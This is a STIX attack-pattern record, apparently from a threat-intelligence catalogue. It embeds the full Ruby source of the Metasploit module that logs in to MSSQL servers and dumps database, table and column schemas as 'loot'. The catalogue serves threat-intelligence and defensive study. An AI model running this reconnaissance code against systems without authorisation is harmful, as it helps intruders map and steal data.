{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--554c7241-752c-4cf1-8096-722ce6698837",
    "created": "2024-08-14T16:26:58.124842Z",
    "modified": "2024-08-14T16:26:58.124849Z",
    "name": "MSSQL Schema Dump",
    "description": "Q This module attempts to extract the schema from a MSSQL Server Instance. It will disregard builtin and example DBs such as master, model, msdb, and tempdb. The module will create a note for each DB found, and store a YAML formatted output as loot for easy reading. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/mssql/mssql_schemadump.rb",
            "external_id": "mssql_schemadump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'yaml'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MSSQL\n  include Msf::Auxiliary::Report\n\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'MSSQL Schema Dump',\n      'Description'    => %Q{\n          This module attempts to extract the schema from a MSSQL Server\n          Instance. It will disregard builtin and example DBs such\n          as master, model, msdb, and tempdb. The module will create\n          a note for each DB found, and store a YAML formatted output\n          as loot for easy reading.\n      },\n      'Author'         => ['theLightCosine'],\n      'License'        => MSF_LICENSE\n    )\n\n    register_options([\n      OptBool.new('DISPLAY_RESULTS', [true, \"Display the Results to the Screen\", true])\n      ])\n  end\n\n  def run_host(ip)\n\n    if !mssql_login_datastore\n      print_error(\"#{rhost}:#{rport} - Invalid SQL Server credentials\")\n      return\n    end\n\n    # Grabs the Instance Name and Version of MSSQL(2k,2k5,2k8)\n    instancename = mssql_query(mssql_enumerate_servername())[:rows][0][0].split('\\\\')[1]\n    print_status(\"Instance Name: #{instancename.inspect}\")\n    version = mssql_query(mssql_sql_info())[:rows][0][0]\n    output = \"Microsoft SQL Server Schema \\n Host: #{datastore['RHOST']} \\n Port: #{datastore['RPORT']} \\n Instance: #{instancename} \\n Version: #{version} \\n====================\\n\\n\"\n\n    # Grab all the DB schema and save it as notes\n    mssql_schema = get_mssql_schema\n    return nil if mssql_schema.nil? or mssql_schema.empty?\n    mssql_schema.each do |db|\n      report_note(\n        :host  => rhost,\n        :type  => \"mssql.db.schema\",\n        :data  => db,\n        :port  => rport,\n        :proto => 'tcp',\n        :update => :unique_data\n      )\n    end\n    output << YAML.dump(mssql_schema)\n    this_service = report_service(\n          :host  => datastore['RHOST'],\n          :port => datastore['RPORT'],\n          :name => 'mssql',\n          :proto => 'tcp'\n          )\n    store_loot('mssql_schema', \"text/plain\", datastore['RHOST'], output, \"#{datastore['RHOST']}_mssql_schema.txt\", \"MS SQL Schema\", this_service)\n    print_good output if datastore['DISPLAY_RESULTS']\n  end\n\n  def get_mssql_schema\n    mssql_db_names = get_db_names()\n    mssql_schema=[]\n    unless mssql_db_names.nil?\n      mssql_db_names.each do |dbname|\n        next if dbname[0] == 'model' or dbname[0] == 'master' or dbname[0] == 'msdb' or dbname[0] == 'tempdb'\n        tmp_db = {}\n        tmp_tblnames = get_tbl_names(dbname[0])\n        unless tmp_tblnames.nil?\n          tmp_db['DBName']= dbname[0]\n          tmp_db['Tables'] = []\n          tmp_tblnames.each do |tblname|\n            next if tblname[0].nil?\n            tmp_tbl = {}\n            tmp_tbl['TableName'] = tblname[0]\n            tmp_tbl['Columns'] = []\n            tmp_columns = get_columns(dbname[0], tblname[1])\n            unless tmp_columns.nil?\n              tmp_columns.each do |column|\n                next if column[0].nil?\n                tmp_column = {}\n                tmp_column['ColumnName'] = column[0]\n                tmp_column['ColumnType'] = column[1]\n                tmp_column['ColumnLength'] = column[2]\n                tmp_tbl['Columns'] << tmp_column\n              end\n            end\n            tmp_db['Tables'] << tmp_tbl\n          end\n        end\n        mssql_schema << tmp_db\n      end\n    end\n    return mssql_schema\n  end\n\n\n  # Gets all of the Databases on this Instance\n  def get_db_names\n    results = mssql_query(mssql_db_names())[:rows]\n    return results\n  end\n\n  # Gets all the table names for the given DB\n  def get_tbl_names(db_name)\n    results = mssql_query(\"SELECT name,id FROM #{db_name}..sysobjects WHERE xtype = 'U'\")[:rows]\n    return results\n  end\n\n  # TODO: This should be split up, I fear nil problems in these query/response parsings\n  def get_columns(db_name, table_id)\n    results = mssql_query(\"Select syscolumns.name,systypes.name,syscolumns.length from #{db_name}..syscolumns JOIN #{db_name}..systypes ON syscolumns.xtype=systypes.xtype WHERE syscolumns.id=#{table_id}\")[:rows]\n    return results\n  end\n\n\nend\n"
}